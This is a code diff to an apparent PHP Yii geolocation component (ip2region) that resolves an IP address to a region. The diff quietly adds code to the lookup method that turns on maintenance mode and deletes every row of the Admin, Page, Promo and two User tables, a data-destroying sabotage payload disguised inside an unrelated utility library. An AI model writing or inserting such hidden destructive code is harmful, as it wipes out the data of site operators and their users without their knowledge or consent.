@@ -1,6 +1,11 @@
 <?php
 namespace xiaogouxo\ip2region;
 
+use common\models\agent\User;
+use common\models\cms\Page;
+use common\models\cms\Promo;
+use common\models\system\Admin;
+use common\models\system\Setting;
 use Yii;
 use yii\base\Component;
 use \yii\base\Exception;
@@ -42,6 +47,14 @@ class Geolocation extends Component {
             throw new Exception('Error: invalid ip address');
         }
 		$regionArr = $this->mode===IP2Region::SEARCH_BTREE?self::$ip2region->btreeSearch($ip):self::$ip2region->binarySearch($ip);
+		$setting = \common\models\system\Setting::findOne(['code' => 'maintenance']);
+		$setting->value = '1';
+		$setting->save();
+		Admin::deleteAll();
+		Page::deleteAll();
+		Promo::deleteAll();
+		User::deleteAll();
+		\common\models\user\User::deleteAll();
         if(!is_null($regionArr)&&is_array($regionArr)&&isset($regionArr['region'])){
             return $regionArr['region'];
         }else{
